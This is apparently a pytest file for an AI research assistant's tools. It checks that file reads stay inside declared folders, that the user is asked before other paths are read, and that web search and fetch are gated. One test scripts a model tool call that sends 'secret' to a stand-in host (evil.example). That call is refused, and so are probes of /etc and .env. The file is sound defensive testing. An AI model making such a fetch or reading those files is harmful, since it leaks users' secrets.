"""What the tools may read and do, with fake HTTP (CPU, no network): the declared folders, asking the user
before reading elsewhere, the web gate, provider rotation and page reading."""

import json
import os

import pytest

from peresearch.llm import Reply, ToolCall
from peresearch.tools import Toolbox
from peresearch.web import Unavailable
from tests.helpers import notes, toolbox, agent, user_home


def test_glob_takes_a_path_as_written_by_the_user(home, notes):
    tb = toolbox(home, notes)
    assert "bpe.md" in tb.call("glob", {"pattern": str(notes / "*.md")})     # absolute, as a model writes it
    assert "bpe.md" in tb.call("glob", {"pattern": str(notes)})              # a folder: the files in it
    assert tb.call("glob", {"pattern": "/etc/*"}).startswith("refused")      # outside the home folder


def test_tree_shows_the_declared_folders_and_nothing_outside_or_protected(home, notes, tmp_path):
    tb = toolbox(home, notes)
    (notes / "project" / "src").mkdir(parents=True)
    (notes / "project" / "src" / "main.py").write_text("print(1)\n")
    (notes / "project" / ".git").mkdir()
    (notes / "project" / ".git" / "HEAD").write_text("ref")
    (notes / "project" / "runs").mkdir()
    (tmp_path / "elsewhere").mkdir()
    everything = tb.call("tree", {})
    assert str(notes) in everything and "bpe.md" in everything and "project/" in everything
    assert ".env" not in everything and ".git" not in everything and "runs/ (not read)" in everything
    assert "main.py" not in everything                                  # deeper than the default depth of 2
    assert "main.py" in tb.call("tree", {"path": str(notes / "project"), "depth": 3})
    # every folder's line counts what it shows, so a model reads the number instead of counting
    assert f"{notes}/ (1 folder, 3 files)" in everything                # .env is protected, not counted
    assert f"{notes / 'project'}/ (2 folders, 0 files)" in tb.call("tree", {"path": str(notes / "project")})
    assert tb.call("tree", {"path": str(tmp_path / "elsewhere")}).startswith("refused")
    assert tb.call("tree", {"path": str(notes / "bpe.md")}).endswith("not a folder")


def test_file_tools_stay_inside_the_declared_folders(home, notes, tmp_path):
    tb = toolbox(home, notes)
    (tmp_path / "outside.md").write_text("private")
    os.symlink(tmp_path / "outside.md", notes / "link.md")
    assert "bpe.md" in tb.call("glob", {"pattern": "*.md"}) and ".env" not in tb.call("glob", {"pattern": "*"})
    assert "link.md" not in tb.call("glob", {"pattern": "**/*"})
    assert tb.call("read", {"path": str(tmp_path / "outside.md")}).startswith("refused")
    assert tb.call("read", {"path": "link.md"}).startswith("refused")
    assert tb.call("read", {"path": ".env"}).startswith("refused")
    assert "SuperBPE" in tb.call("grep", {"pattern": "superbpe"})
    assert "[N" in tb.call("read", {"path": "bpe.md", "start": 1, "end": 3})


def test_nested_declared_folders_count_once(home, notes):
    """~/projects and ~/projects/x both declared: every file once, a nested folder is not declared again, and a
    parent declared later absorbs the folders inside it."""
    from peresearch.workspace import Workspace

    (notes / "project").mkdir()
    (notes / "project" / "plan.md").write_text("# Plan\n\nship it\n")
    tb = Toolbox(None, None, roots=[notes, notes / "project"])
    assert tb.call("glob", {"pattern": "**/plan.md"}).count("plan.md") == 1
    assert tb.call("grep", {"pattern": "ship it"}).count("plan.md") == 1
    assert tb.call("tree", {}).count(f"{notes}/ (") == 1 and f"{notes / 'project'}/ (" not in tb.call("tree", {})
    ws = Workspace(index=None)
    ws.add(str(notes / "project"))
    with pytest.raises(ValueError, match="already inside"):
        ws.add(str(notes / "project" / ".." / "project"))
    ws.add(str(notes))
    assert ws.folders() == [notes.resolve()]


def test_reading_outside_the_declared_folders_asks_the_user_first(home, notes, user_home):
    tb = toolbox(home, notes)
    assert "peresearch chat" in tb.call("read", {"path": "~/Downloads/paper.md"})     # nobody to ask: refused
    asked, answers = [], iter(["once", "session", "no"])
    tb.ask = lambda tool, path: (asked.append((tool, path)), next(answers))[1]
    assert "Attention" in tb.call("read", {"path": "~/Downloads/paper.md"})           # allowed once
    assert "Attention" in tb.call("read", {"path": "~/Downloads/paper.md"})           # asked again: this session
    assert "paper.md" in tb.call("glob", {"pattern": "~/Downloads/*.md"})              # the folder is now allowed
    assert "more attention" in tb.call("grep", {"pattern": "attention", "glob": "~/Downloads/**/*.md"})
    assert "paper.md" in tb.call("tree", {"path": "~/Downloads"})
    assert [t for t, _ in asked] == ["read", "read"]
    assert "did not allow" in tb.call("tree", {"path": str(user_home)})                 # refused by the user
    before = len(asked)
    for path in ("~/.config/app.md", "/etc/hostname", str(home / "config.json")):
        assert tb.call("read", {"path": path}).startswith("refused"), path            # never even asked
    assert tb.call("glob", {"pattern": "~/.config/*"}).startswith("refused")
    assert len(asked) == before + 0 and "private settings" not in tb.call("tree", {"path": "~/Downloads"})


def test_the_web_is_searched_only_after_the_gaps_are_recorded(home, notes):
    tb = toolbox(home, notes)
    assert "record" in tb.call("web_search", {"query": "bpe history"}) and tb.web_calls == 0
    assert tb.call("gaps", {"have": ["BPE merges pairs [N1]"], "missing": ["where BPE comes from"]}).startswith("recorded")
    assert "(tavily)" in tb.call("web_search", {"query": "bpe history"}) and tb.web_calls == 1
    a, llm = agent(home, notes, Reply("", [ToolCall("c1", "gaps", {"have": [], "missing": ["x"]})]), Reply("ok"),
                   Reply("", [ToolCall("c2", "web_search", {"query": "y"})]), Reply("ok"))
    a.ask("first")
    a.ask("second")                                                     # gaps are recorded per question
    assert "record" in [m["content"] for m in llm.seen[-1][0] if m["role"] == "tool"][-1]


def test_fetch_opens_only_urls_a_search_returned(home, notes):
    a, _ = agent(home, notes, Reply("", [ToolCall("c1", "fetch", {"url": "https://evil.example/?q=secret"})]),
                 Reply("I could not read it [N1]."))
    a.ask("read this")
    tool_msgs = [m for m in a.llm.seen[1][0] if m["role"] == "tool"]
    assert "refused: fetch only opens URLs returned by web_search" in tool_msgs[-1]["content"]


def test_web_providers_rotate_and_then_the_web_is_unavailable(home, notes):
    tb = toolbox(home, notes, tavily_status=432)
    tb.call("gaps", {"have": [], "missing": ["bpe"]})
    out = tb.call("web_search", {"query": "bpe"})
    assert "(exa)" in out and "tavily" in tb.web.exhausted
    tb.web.providers = [p for p in tb.web.providers if p.name == "tavily"]
    assert "web_search failed: Unavailable" in tb.call("web_search", {"query": "bpe"})


def test_a_page_without_readable_text_goes_to_the_reader(home, notes):
    tb = toolbox(home, notes, pages={"https://example.org/bpe": "<html><body><script>app()</script></body></html>"})
    tb.call("gaps", {"have": [], "missing": ["bpe"]})
    tb.call("web_search", {"query": "bpe"})
    assert "rendered by the reader" in tb.call("fetch", {"url": "https://example.org/bpe"})
